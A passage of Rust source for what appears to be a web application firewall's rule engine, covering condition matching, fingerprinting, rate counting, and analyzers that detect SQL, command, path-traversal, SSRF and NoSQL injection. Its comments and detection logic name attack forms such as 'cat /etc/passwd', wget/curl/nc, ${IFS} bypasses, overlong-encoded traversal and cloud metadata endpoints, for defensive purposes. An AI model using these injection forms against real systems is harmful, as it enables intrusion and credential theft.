            "named_argument" => self.eval_named_argument(condition, ctx, trace, rule_id, depth),
            "header" => self.eval_header(condition, ctx, trace, rule_id, depth),
            "contains" => eval_contains(condition.match_value.as_ref(), value),
            "starts_with" => eval_starts_with(condition.match_value.as_ref(), value),
            "equals" => eval_equals(condition.match_value.as_ref(), value),
            "regex" => self.eval_regex(condition.match_value.as_ref(), value),
            "word" => self.eval_word(condition.match_value.as_ref(), value),
            "multiple_contains" => eval_multiple_contains(condition.match_value.as_ref(), value),
            "to_lowercase" => match value {
                Some(v) => {
                    let lowered = v.to_lowercase();
                    condition
                        .match_value
                        .as_ref()
                        .and_then(|m| m.as_cond())
                        .map(|child| {
                            self.eval_condition(
                                child,
                                ctx,
                                Some(&lowered),
                                trace,
                                rule_id,
                                depth + 1,
                            )
                        })
                        .unwrap_or(true)
                }
                None => false,
            },
            "percent_decode" => match value {
                Some(v) => {
                    let decoded = safe_percent_decode(v);
                    condition
                        .match_value
                        .as_ref()
                        .and_then(|m| m.as_cond())
                        .map(|child| {
                            self.eval_condition(
                                child,
                                ctx,
                                Some(&decoded),
                                trace,
                                rule_id,
                                depth + 1,
                            )
                        })
                        .unwrap_or(false)
                }
                None => false,
            },
            "decode_if_base64" => match value {
                Some(v) => {
                    let decoded = decode_if_base64(v);
                    condition
                        .match_value
                        .as_ref()
                        .and_then(|m| m.as_cond())
                        .map(|child| {
                            self.eval_condition(
                                child,
                                ctx,
                                Some(&decoded),
                                trace,
                                rule_id,
                                depth + 1,
                            )
                        })
                        .unwrap_or(false)
                }
                None => false,
            },
            "request" => {
                let raw = build_raw_request(ctx);
                condition
                    .match_value
                    .as_ref()
                    .and_then(|m| m.as_cond())
                    .map(|child| {
                        self.eval_condition(child, ctx, Some(&raw), trace, rule_id, depth + 1)
                    })
                    .unwrap_or(false)
            }
            "request_json" => match ctx.json_text.as_deref() {
                Some(json_text) => condition
                    .match_value
                    .as_ref()
                    .and_then(|m| m.as_cond())
                    .map(|child| {
                        self.eval_condition(child, ctx, Some(json_text), trace, rule_id, depth + 1)
                    })
                    .unwrap_or(true),
                None => false,
            },
            "static_content" => condition
                .match_value
                .as_ref()
                .and_then(|m| m.as_bool())
                .map(|target| ctx.is_static == target)
                .unwrap_or(false),
            "ja4" => self.eval_ja4(condition, ctx, trace, rule_id, depth),
            "ja4h" => self.eval_ja4h(condition, ctx, trace, rule_id, depth),
            "dlp_violation" => eval_dlp_violation(condition, ctx),
            "schema_violation" => eval_schema_violation(condition, ctx),
            "compare" => eval_compare(condition, value),
            "count_odd" => eval_count_odd(condition.match_value.as_ref(), value),
            "sql_analyzer" => self.eval_sql_analyzer(condition, value, ctx, trace, rule_id, depth),
            "xss_analyzer" => self.eval_xss_analyzer(condition, value, ctx, trace, rule_id, depth),
            "cmd_analyzer" => self.eval_cmd_analyzer(condition, value, ctx, trace, rule_id, depth),
            "path_traversal_analyzer" => {
                self.eval_path_traversal_analyzer(condition, value, ctx, trace, rule_id, depth)
            }
            "ssrf_analyzer" => {
                self.eval_ssrf_analyzer(condition, value, ctx, trace, rule_id, depth)
            }
            "nosql_analyzer" => {
                self.eval_nosql_analyzer(condition, value, ctx, trace, rule_id, depth)
            }
            "hashset" => eval_hashset(condition.match_value.as_ref(), value),
            "parse_multipart" => self.eval_parse_multipart(condition, ctx, trace, rule_id, depth),
            "track_by_ip" => self.eval_track_by_ip(condition, ctx, trace, rule_id, depth),
            "extract_argument" => self.eval_extract_argument(condition, ctx, trace, rule_id, depth),
            "unique_count" => {
                self.eval_unique_count(condition, ctx, value, &[], trace, rule_id, depth)
            }
            "count" => self.eval_count(condition, ctx, trace, rule_id, depth),
            "remember_match" => condition
                .match_value
                .as_ref()
                .and_then(|m| m.as_cond())
                .map(|child| self.eval_condition(child, ctx, value, trace, rule_id, depth + 1))
                .unwrap_or(false),
            _ => false,
        };

        if trace.is_enabled() {
            trace.emit(TraceEvent::ConditionEvaluated {
                rule_id,
                kind: condition.kind.clone(),
                field: condition.field.clone(),
                op: condition.op.clone(),
                name: condition.name.clone(),
                matched,
            });
        }

        matched
    }

    fn eval_boolean(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        value: Option<&str>,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let op = condition.op.as_deref().unwrap_or("and");
        let Some(match_value) = condition.match_value.as_ref() else {
            return true;
        };

        match op {
            "and" => {
                if let Some(items) = match_value.as_arr() {
                    for item in items {
                        let Some(child) = item.as_cond() else {
                            continue;
                        };
                        if !self.eval_condition(child, ctx, value, trace, rule_id, depth + 1) {
                            return false;
                        }
                    }
                    true
                } else if let Some(child) = match_value.as_cond() {
                    self.eval_condition(child, ctx, value, trace, rule_id, depth + 1)
                } else {
                    true
                }
            }
            "or" => {
                let mut saw_operand = false;
                if let Some(items) = match_value.as_arr() {
                    for item in items {
                        let Some(child) = item.as_cond() else {
                            continue;
                        };
                        saw_operand = true;
                        if self.eval_condition(child, ctx, value, trace, rule_id, depth + 1) {
                            return true;
                        }
                    }
                    !saw_operand
                } else if let Some(child) = match_value.as_cond() {
                    self.eval_condition(child, ctx, value, trace, rule_id, depth + 1)
                } else {
                    true
                }
            }
            "not" => {
                if let Some(items) = match_value.as_arr() {
                    for item in items {
                        let Some(child) = item.as_cond() else {
                            continue;
                        };
                        if self.eval_condition(child, ctx, value, trace, rule_id, depth + 1) {
                            return false;
                        }
                    }
                    true
                } else if let Some(child) = match_value.as_cond() {
                    !self.eval_condition(child, ctx, value, trace, rule_id, depth + 1)
                } else {
                    true
                }
            }
            _ => false,
        }
    }

    fn eval_method(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let method = ctx.method;
        let Some(match_value) = condition.match_value.as_ref() else {
            return false;
        };
        if let Some(s) = match_value.as_str() {
            return method.eq_ignore_ascii_case(s);
        }
        if let Some(arr) = match_value.as_arr() {
            for item in arr {
                if let Some(s) = item.as_str() {
                    if method.eq_ignore_ascii_case(s) {
                        return true;
                    }
                }
            }
            return false;
        }
        if let Some(child) = match_value.as_cond() {
            return self.eval_condition(child, ctx, Some(method), trace, rule_id, depth + 1);
        }
        false
    }

    fn eval_uri(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let uri = ctx.url;
        let Some(match_value) = condition.match_value.as_ref() else {
            return false;
        };
        if let Some(s) = match_value.as_str() {
            return uri.contains(s);
        }
        if let Some(child) = match_value.as_cond() {
            return self.eval_condition(child, ctx, Some(uri), trace, rule_id, depth + 1);
        }
        false
    }

    /// JA4 TLS fingerprint match. Returns false if JA4 is not available
    /// (e.g. non-TLS connection or upstream did not forward the fingerprint).
    /// A bare string match is treated as a substring check on the raw
    /// fingerprint. A nested condition receives the raw fingerprint as its value.
    fn eval_ja4(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(fp) = ctx.fingerprint else {
            return false;
        };
        let Some(ja4) = fp.ja4.as_ref() else {
            return false;
        };
        let raw = ja4.raw.as_str();
        let Some(match_value) = condition.match_value.as_ref() else {
            return false;
        };
        if let Some(s) = match_value.as_str() {
            return raw.contains(s);
        }
        if let Some(child) = match_value.as_cond() {
            return self.eval_condition(child, ctx, Some(raw), trace, rule_id, depth + 1);
        }
        false
    }

    /// JA4H HTTP fingerprint match. JA4H is always computed for HTTP requests,
    /// so a bare string match is a substring check on the raw fingerprint
    /// and a nested condition receives the raw fingerprint as its value.
    fn eval_ja4h(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(fp) = ctx.fingerprint else {
            return false;
        };
        let raw = fp.ja4h.raw.as_str();
        let Some(match_value) = condition.match_value.as_ref() else {
            return false;
        };
        if let Some(s) = match_value.as_str() {
            return raw.contains(s);
        }
        if let Some(child) = match_value.as_cond() {
            return self.eval_condition(child, ctx, Some(raw), trace, rule_id, depth + 1);
        }
        false
    }

    fn eval_args(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(child) = condition.match_value.as_ref().and_then(|m| m.as_cond()) else {
            return false;
        };
        for candidate in &ctx.args {
            if self.eval_condition(child, ctx, Some(candidate), trace, rule_id, depth + 1) {
                return true;
            }
        }
        false
    }

    fn eval_named_argument(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(child) = condition.match_value.as_ref().and_then(|m| m.as_cond()) else {
            return false;
        };
        let name = condition.name.as_deref().unwrap_or("*");
        for entry in &ctx.arg_entries {
            if (name == "*" || entry.key == name)
                && self.eval_condition(child, ctx, Some(&entry.value), trace, rule_id, depth + 1)
            {
                return true;
            }
        }
        false
    }

    fn eval_header(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        if let Some(direction) = condition.direction.as_deref() {
            if direction != "c2s" {
                return false;
            }
        }
        let Some(field) = condition.field.as_deref() else {
            return false;
        };
        let header_value = get_header_value(&ctx.headers, field);
        let Some(header_value) = header_value else {
            return false;
        };
        if condition.match_value.is_none() {
            return true;
        }
        let Some(child) = condition.match_value.as_ref().and_then(|m| m.as_cond()) else {
            return false;
        };
        self.eval_condition(child, ctx, Some(header_value), trace, rule_id, depth + 1)
    }

    fn eval_regex(&self, match_value: Option<&MatchValue>, value: Option<&str>) -> bool {
        let Some(value) = value else {
            return false;
        };
        let Some(pattern) = match_value.and_then(|m| m.as_str()) else {
            return false;
        };
        let Some(re) = self.regex_cache.get(pattern) else {
            return false;
        };
        re.is_match(value)
    }

    fn eval_word(&self, match_value: Option<&MatchValue>, value: Option<&str>) -> bool {
        let Some(value) = value else {
            return false;
        };
        let Some(word) = match_value.and_then(|m| m.as_str()) else {
            return false;
        };
        if let Some(re) = self.word_regex_cache.get(word) {
            return re.is_match(value);
        }
        // Fallback
        let pattern = format!(r"(?i)\b{}\b", regex::escape(word));
        let Ok(re) = RegexBuilder::new(&pattern).multi_line(true).build() else {
            return false;
        };
        re.is_match(value)
    }

    fn eval_sql_analyzer(
        &self,
        condition: &MatchCondition,
        value: Option<&str>,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(value) = value else {
            return false;
        };
        let score = sql_analyzer_score(value);
        match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
            Some(child) => self.eval_condition(
                child,
                ctx,
                Some(&score.to_string()),
                trace,
                rule_id,
                depth + 1,
            ),
            None => score > 0,
        }
    }

    fn eval_xss_analyzer(
        &self,
        condition: &MatchCondition,
        value: Option<&str>,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(value) = value else {
            return false;
        };
        let score = xss_analyzer_score(value);
        match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
            Some(child) => self.eval_condition(
                child,
                ctx,
                Some(&score.to_string()),
                trace,
                rule_id,
                depth + 1,
            ),
            None => score > 0,
        }
    }

    fn eval_cmd_analyzer(
        &self,
        condition: &MatchCondition,
        value: Option<&str>,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(value) = value else {
            return false;
        };
        let score = cmd_analyzer_score(value);
        match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
            Some(child) => self.eval_condition(
                child,
                ctx,
                Some(&score.to_string()),
                trace,
                rule_id,
                depth + 1,
            ),
            None => score > 0,
        }
    }

    fn eval_path_traversal_analyzer(
        &self,
        condition: &MatchCondition,
        value: Option<&str>,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(value) = value else {
            return false;
        };
        let score = path_traversal_analyzer_score(value);
        match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
            Some(child) => self.eval_condition(
                child,
                ctx,
                Some(&score.to_string()),
                trace,
                rule_id,
                depth + 1,
            ),
            None => score > 0,
        }
    }

    /// Evaluate SSRF analyzer condition.
    ///
    /// SECURITY: Detects Server-Side Request Forgery attempts targeting internal
    /// services, cloud metadata endpoints, and dangerous URL schemes.
    fn eval_ssrf_analyzer(
        &self,
        condition: &MatchCondition,
        value: Option<&str>,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(value) = value else {
            return false;
        };
        let score = ssrf_analyzer_score(value);
        match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
            Some(child) => self.eval_condition(
                child,
                ctx,
                Some(&score.to_string()),
                trace,
                rule_id,
                depth + 1,
            ),
            None => score > 0,
        }
    }

    /// Evaluate NoSQL injection analyzer condition.
    ///
    /// SECURITY: Detects NoSQL injection attempts targeting MongoDB, CouchDB,
    /// Redis, Cassandra, and other document/key-value stores.
    fn eval_nosql_analyzer(
        &self,
        condition: &MatchCondition,
        value: Option<&str>,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(value) = value else {
            return false;
        };
        let score = nosql_analyzer_score(value);
        match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
            Some(child) => self.eval_condition(
                child,
                ctx,
                Some(&score.to_string()),
                trace,
                rule_id,
                depth + 1,
            ),
            None => score > 0,
        }
    }

    fn eval_parse_multipart(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(child) = condition.match_value.as_ref().and_then(|m| m.as_cond()) else {
            return false;
        };
        let raw_bytes: &[u8] = if let Some(body_text) = ctx.body_text {
            body_text.as_bytes()
        } else if let Some(raw) = ctx.raw_body {
            raw
        } else {
            return false;
        };
        let content_type = ctx.headers.get("content-type").copied().unwrap_or("");
        let Some(boundary) = extract_multipart_boundary(content_type) else {
            return false;
        };
        let values = parse_multipart_values(raw_bytes, &boundary);
        for part_value in &values {
            if self.eval_condition(child, ctx, Some(part_value), trace, rule_id, depth + 1) {
                return true;
            }
        }
        false
    }

    fn eval_track_by_ip(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let Some(child) = condition.match_value.as_ref().and_then(|m| m.as_cond()) else {
            return false;
        };
        self.process_track_condition(child, ctx, Vec::new(), trace, rule_id, depth + 1)
    }

    fn eval_extract_argument(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let selector = condition.selector.as_deref();
        let extracted = select_argument_values(self, selector, ctx);
        if extracted.is_empty() {
            return false;
        }
        match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
            Some(child) => {
                self.process_track_condition(child, ctx, extracted, trace, rule_id, depth + 1)
            }
            None => true,
        }
    }

    fn eval_unique_count(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        value: Option<&str>,
        values: &[String],
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let timeframe = condition.timeframe.unwrap_or(60);
        let trace_label = "unique_count";

        let values_to_record: Vec<String> = if !values.is_empty() {
            values.to_vec()
        } else if let Some(v) = value {
            vec![v.to_string()]
        } else {
            Vec::new()
        };

        let unique_count = {
            let mut store = self.store.write();
            if values_to_record.is_empty() {
                store.get_unique_count(ctx.ip, trace_label, timeframe)
            } else {
                store.record_unique_values(ctx.ip, trace_label, &values_to_record, timeframe)
            }
        };

        if let Some(mv) = condition.match_value.as_ref() {
            if let Some(child) = mv.as_cond() {
                return self.eval_condition(
                    child,
                    ctx,
                    Some(&unique_count.to_string()),
                    trace,
                    rule_id,
                    depth + 1,
                );
            }
            if let Some(num) = mv.as_num() {
                return unique_count as f64 >= num;
            }
        }

        if let Some(count) = condition.count {
            unique_count as u64 >= count
        } else {
            unique_count > 0
        }
    }

    fn eval_count(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        let timeframe = condition.timeframe.unwrap_or(60);
        let trace_label = "count";

        if let Some(child) = condition.match_value.as_ref().and_then(|m| m.as_cond()) {
            if !self.eval_condition(child, ctx, None, trace, rule_id, depth + 1) {
                return false;
            }
        }

        let count = {
            let mut store = self.store.write();
            store.record_event(ctx.ip, trace_label, timeframe)
        };

        let threshold = condition.count.unwrap_or(1);
        count as u64 >= threshold
    }

    fn process_track_condition(
        &self,
        condition: &MatchCondition,
        ctx: &EvalContext,
        values: Vec<String>,
        trace: &mut TraceState,
        rule_id: u32,
        depth: u32,
    ) -> bool {
        match condition.kind.as_str() {
            "extract_argument" => {
                let selector = condition.selector.as_deref();
                let extracted = select_argument_values(self, selector, ctx);
                if extracted.is_empty() {
                    return false;
                }
                match condition.match_value.as_ref().and_then(|m| m.as_cond()) {
                    Some(child) => self.process_track_condition(
                        child,
                        ctx,
                        extracted,
                        trace,
                        rule_id,
                        depth + 1,
                    ),
                    None => {
                        let mut store = self.store.write();
                        store.record_unique_values(ctx.ip, "extract", &extracted, 60);
                        true
                    }
                }
            }
            "unique_count" => {
                self.eval_unique_count(condition, ctx, None, &values, trace, rule_id, depth + 1)
            }
            "count" => self.eval_count(condition, ctx, trace, rule_id, depth + 1),
            _ => {
                let candidate = values.first().map(|s| s.as_str());
                self.eval_condition(condition, ctx, candidate, trace, rule_id, depth + 1)
            }
        }
    }
}

// Helper functions

fn compute_available_features(ctx: &EvalContext) -> u16 {
    let mut out = 0u16;
    if !ctx.args.is_empty() {
        out |= REQ_ARGS;
    }
    if !ctx.arg_entries.is_empty() {
        out |= REQ_ARG_ENTRIES;
    }
    let has_body = ctx.body_text.is_some() || ctx.raw_body.is_some();
    if has_body {
        out |= REQ_BODY;
    }
    if ctx.json_text.is_some() {
        out |= REQ_JSON;
    }
    out
}

fn compute_request_header_mask(index: &RuleIndex, headers: &HashMap<String, &str>) -> u64 {
    let mut mask = 0u64;
    for (bit, header) in index.header_bits.iter().enumerate() {
        if bit >= 64 {
            break;
        }
        if headers.contains_key(header) {
            mask |= 1u64 << bit;
        }
    }
    mask
}

fn get_header_value<'a>(headers: &'a HashMap<String, &'a str>, field: &str) -> Option<&'a str> {
    let key = field.to_ascii_lowercase();
    headers
        .get(&key)
        .copied()
        .or_else(|| headers.get(field).copied())
}

fn eval_contains(match_value: Option<&MatchValue>, value: Option<&str>) -> bool {
    let Some(value) = value else {
        return false;
    };
    let Some(s) = match_value.and_then(|m| m.as_str()) else {
        return false;
    };
    value.contains(s)
}

fn eval_starts_with(match_value: Option<&MatchValue>, value: Option<&str>) -> bool {
    let Some(value) = value else {
        return false;
    };
    let Some(s) = match_value.and_then(|m| m.as_str()) else {
        return false;
    };
    value.starts_with(s)
}

fn eval_equals(match_value: Option<&MatchValue>, value: Option<&str>) -> bool {
    let Some(value) = value else {
        return false;
    };
    let Some(s) = match_value.and_then(|m| m.as_str()) else {
        return false;
    };
    value == s
}

fn eval_multiple_contains(match_value: Option<&MatchValue>, value: Option<&str>) -> bool {
    let Some(value) = value else {
        return false;
    };
    let Some(arr) = match_value.and_then(|m| m.as_arr()) else {
        return false;
    };
    for item in arr {
        if let Some(s) = item.as_str() {
            if value.contains(s) {
                return true;
            }
        }
    }
    false
}

fn eval_hashset(match_value: Option<&MatchValue>, value: Option<&str>) -> bool {
    let Some(value) = value else {
        return false;
    };
    let Some(arr) = match_value.and_then(|m| m.as_arr()) else {
        return false;
    };
    for item in arr {
        if let Some(s) = item.as_str() {
            if s.eq_ignore_ascii_case(value) {
                return true;
            }
        }
    }
    false
}

fn eval_compare(condition: &MatchCondition, candidate: Option<&str>) -> bool {
    let Some(candidate) = candidate else {
        return false;
    };
    let Ok(candidate_num) = candidate.parse::<f64>() else {
        return false;
    };
    let Some(target) = condition.match_value.as_ref().and_then(|m| m.as_num()) else {
        return false;
    };
    let op = condition.op.as_deref().unwrap_or("eq");
    match op {
        "gte" => candidate_num >= target,
        "lte" => candidate_num <= target,
        "gt" => candidate_num > target,
        "lt" => candidate_num < target,
        "eq" => candidate_num == target,
        _ => false,
    }
}

fn eval_count_odd(match_value: Option<&MatchValue>, value: Option<&str>) -> bool {
    let Some(value) = value else {
        return false;
    };
    let Some(needle) = match_value.and_then(|m| m.as_str()) else {
        return false;
    };
    if needle.is_empty() {
        return false;
    }
    let count = value.matches(needle).count();
    count % 2 == 1
}

fn sql_analyzer_score(value: &str) -> u32 {
    if SQL_KEYWORDS.is_match(value)
        || SQL_PHRASES.is_match(value)
        || SQL_OR_AND_EQ.is_match(value)
        || SQL_COMMENT_1.is_match(value)
        || SQL_COMMENT_2.is_match(value)
        || SQL_SHUTDOWN.is_match(value)
    {
        1
    } else {
        0
    }
}

/// Analyzes a value for command injection patterns.
///
/// SECURITY: Detects OS command injection attempts including:
/// - Backtick command execution: `cmd`
/// - Subshell command substitution: $(cmd)
/// - Variable substitution: ${IFS}, ${PATH}
/// - Newline injection: %0a, %0d, literal newlines
/// - Command chaining: ; | && ||
/// - Brace expansion: {cmd1,cmd2}
/// - Dangerous commands: cat /etc/passwd, wget, curl, nc, etc.
/// - Redirection: > >> < 2>&1
/// - Null byte injection: %00
fn cmd_analyzer_score(value: &str) -> u32 {
    // First check the raw value
    if check_cmd_patterns(value) {
        return 1;
    }

    // URL-decode and check again (handles %0a, %00, etc.)
    let decoded = safe_percent_decode(value);
    if decoded != value && check_cmd_patterns(&decoded) {
        return 1;
    }

    // Double-decode for nested encoding
    if decoded.contains('%') {
        let double_decoded = safe_percent_decode(&decoded);
        if double_decoded != decoded && check_cmd_patterns(&double_decoded) {
            return 1;
        }
    }

    0
}

/// Check command injection patterns against a value.
///
/// Returns true if any command injection pattern is detected.
/// The patterns are ordered roughly by severity/likelihood.
#[inline]
fn check_cmd_patterns(value: &str) -> bool {
    // High-severity patterns (definite command injection)
    CMD_BACKTICK.is_match(value)
        || CMD_SUBSHELL.is_match(value)
        || CMD_DANGEROUS.is_match(value)
        // IFS manipulation (common bypass)
        || CMD_IFS.is_match(value)
        // Variable substitution (${var})
        || CMD_VAR_SUBST.is_match(value)
        // Newline injection (decoded)
        || CMD_NEWLINE_LITERAL.is_match(value)
        // Encoded newlines (not yet decoded)
        || CMD_NEWLINE_ENCODED.is_match(value)
        // Null byte injection
        || CMD_NULL_BYTE.is_match(value)
        // Brace expansion
        || CMD_BRACE.is_match(value)
        // Command chaining (be careful: could match URLs with &&)
        // Only flag if combined with other suspicious patterns
        || (CMD_CHAIN.is_match(value) && has_cmd_context(value))
        // Redirection with command context
        || (CMD_REDIRECT.is_match(value) && has_cmd_context(value))
        // Path traversal with command context
        || (CMD_PATH_TRAVERSAL.is_match(value) && has_cmd_context(value))
}

/// Check if value has command execution context (to reduce false positives).
#[inline]
fn has_cmd_context(value: &str) -> bool {
    // Look for signs of command execution context
    value.contains('`')
        || value.contains("$(")
        || value.contains("${")
        || CMD_DANGEROUS.is_match(value)
        || value.contains("/bin/")
        || value.contains("/usr/bin/")
        || value.contains("/etc/")
        || value.contains("/tmp/")
        || value.contains("/dev/")
}

/// Analyzes a value for path traversal patterns.
///
/// SECURITY: Detects directory traversal attacks including:
/// - Basic: ../, ..\
/// - URL-encoded: %2e%2e%2f
/// - Double-encoded: %252e%252e%252f
/// - Unicode/overlong UTF-8: %c0%ae, %c0%af
/// - Null byte truncation: %00
/// - Sensitive file targets: /etc/passwd, boot.ini
fn path_traversal_analyzer_score(value: &str) -> u32 {
    // First check the raw value
    if check_path_traversal_patterns(value) {
        return 1;
    }

    // URL-decode and check again
    let decoded = safe_percent_decode(value);
    if decoded != value && check_path_traversal_patterns(&decoded) {
        return 1;
    }

    // Double-decode for nested encoding bypass
    if decoded.contains('%') {
        let double_decoded = safe_percent_decode(&decoded);
        if double_decoded != decoded && check_path_traversal_patterns(&double_decoded) {
            return 1;
        }

        // Triple-decode for extreme cases
        if double_decoded.contains('%') {
            let triple_decoded = safe_percent_decode(&double_decoded);
            if triple_decoded != double_decoded && check_path_traversal_patterns(&triple_decoded) {
                return 1;
            }
        }
    }

    // Check for Unicode normalization bypasses
    let normalized = normalize_unicode_path(value);
    if normalized != value && check_path_traversal_patterns(&normalized) {
        return 1;
    }

    0
}

/// Check path traversal patterns against a value.
#[inline]
fn check_path_traversal_patterns(value: &str) -> bool {
    // Basic patterns
    PATH_TRAV_BASIC.is_match(value)
        // URL-encoded patterns (check even on decoded values for partial encoding)
        || PATH_TRAV_ENCODED.is_match(value)
        // Double-encoded patterns
        || PATH_TRAV_DOUBLE.is_match(value)
        // Unicode/overlong UTF-8 patterns
        || PATH_TRAV_UNICODE.is_match(value)
        // Backslash variants
        || PATH_TRAV_BACKSLASH.is_match(value)
        // Null byte injection
        || PATH_TRAV_NULL.is_match(value)
        // Sensitive targets (only if path traversal context present)
        || (has_traversal_context(value) && check_sensitive_targets(value))
}

/// Check if value contains path traversal context.
#[inline]
fn has_traversal_context(value: &str) -> bool {
    value.contains("..")
        || value.contains("%2e")
        || value.contains("%2E")
        || value.contains("%c0")
        || value.contains("%C0")
}

/// Check for sensitive file targets.
#[inline]
fn check_sensitive_targets(value: &str) -> bool {
    PATH_TRAV_TARGETS_UNIX.is_match(value) || PATH_TRAV_TARGETS_WIN.is_match(value)
}

/// Normalize Unicode/overlong UTF-8 encoded paths.
///
/// Handles common overlong UTF-8 encoding bypasses:
/// - %c0%ae -> '.'
/// - %c0%af -> '/'
/// - %c1%9c -> '\'
fn normalize_unicode_path(value: &str) -> String {
    let mut result = value.to_string();

    // Overlong UTF-8 encodings of '.'
    result = result
        .replace("%c0%ae", ".")
        .replace("%C0%AE", ".")
        .replace("%c0%2e", ".")
        .replace("%C0%2E", ".")
        .replace("%e0%80%ae", ".")
        .replace("%E0%80%AE", ".");

    // Overlong UTF-8 encodings of '/'
    result = result
        .replace("%c0%af", "/")
        .replace("%C0%AF", "/")
        .replace("%e0%80%af", "/")
        .replace("%E0%80%AF", "/");

    // Overlong UTF-8 encodings of '\'
    result = result
        .replace("%c1%9c", "\\")
        .replace("%C1%9C", "\\")
        .replace("%c1%1c", "\\")
        .replace("%C1%1C", "\\");

    result
}

/// Analyzes a value for SSRF (Server-Side Request Forgery) patterns.
///
/// SECURITY: Detects SSRF attempts targeting:
/// - Localhost (127.0.0.1, ::1)
/// - Cloud metadata endpoints (169.254.169.254, metadata.google.internal)
/// - Private IP ranges (10.x.x.x, 192.168.x.x, 172.16-31.x.x)
/// - IPv6-mapped IPv4 bypass attempts (::ffff:127.0.0.1)
/// - Dangerous URL schemes (file://, gopher://, dict://, etc.)
/// - Encoded IP bypasses (decimal, hex, octal representations)
///
/// Returns 1 if SSRF patterns are detected, 0 otherwise.
fn ssrf_analyzer_score(value: &str) -> u32 {
    // Check raw value first
    if check_ssrf_patterns(value) {
        return 1;
    }

    // URL-decode and check again (handles %2f -> /, etc.)
    let decoded = safe_percent_decode(value);
    if decoded != value && check_ssrf_patterns(&decoded) {
        return 1;
    }

    // Double-decode for nested encoding bypass
    if decoded.contains('%') {
        let double_decoded = safe_percent_decode(&decoded);
        if double_decoded != decoded && check_ssrf_patterns(&double_decoded) {
            return 1;
        }
    }

    0
}

/// Check SSRF patterns against a value.
///
/// SECURITY: This function is critical for SSRF prevention. It checks for:
/// - Internal IP addresses in URLs
/// - Cloud metadata endpoints
/// - Dangerous URL schemes
#[inline]
fn check_ssrf_patterns(value: &str) -> bool {
    // Dangerous URL schemes (highest priority - always block)
    SSRF_DANGEROUS_SCHEME.is_match(value)
        // Cloud metadata endpoints (CRITICAL - AWS/GCP/Azure instance metadata)
        || SSRF_CLOUD_METADATA.is_match(value)
        || SSRF_METADATA_HOST.is_match(value)
        // Localhost addresses (IPv4 and IPv6)
        || SSRF_LOCALHOST_V4.is_match(value)
        || SSRF_LOCALHOST_V6.is_match(value)
        // IPv6-mapped IPv4 bypass attempts
        || SSRF_MAPPED_IPV6.is_match(value)
        // Private IP ranges
        || SSRF_PRIVATE_IP.is_match(value)
        // Link-local addresses
        || SSRF_LINK_LOCAL.is_match(value)
        // Encoded IP bypasses (decimal/hex/octal)
        || SSRF_ENCODED_IP.is_match(value)
}

/// Analyzes a value for NoSQL injection patterns.
///
/// SECURITY: Detects NoSQL injection attempts including:
/// - MongoDB operator injection ($where, $ne, $gt, etc.)
/// - MongoDB $where JavaScript execution (HIGH RISK)
/// - MongoDB authentication bypass patterns
/// - MongoDB aggregation pipeline injection
/// - CouchDB special endpoints (_all_docs, _view, etc.)
/// - Redis dangerous commands
/// - Cassandra CQL injection
/// - JSON prototype pollution (__proto__, constructor)
///
/// Returns 1 if NoSQL injection patterns are detected, 0 otherwise.
fn nosql_analyzer_score(value: &str) -> u32 {
    // Check raw value first
    if check_nosql_patterns(value) {
        return 1;
    }

    // URL-decode and check again (handles %24where -> $where)
    let decoded = safe_percent_decode(value);
    if decoded != value && check_nosql_patterns(&decoded) {
        return 1;
    }

    // Double-decode for nested encoding bypass
    if decoded.contains('%') {
        let double_decoded = safe_percent_decode(&decoded);
        if double_decoded != decoded && check_nosql_patterns(&double_decoded) {
            return 1;
        }
    }

    0
}

/// Check NoSQL injection patterns against a value.
///
/// SECURITY: This function is critical for NoSQL injection prevention.
#[inline]
fn check_nosql_patterns(value: &str) -> bool {
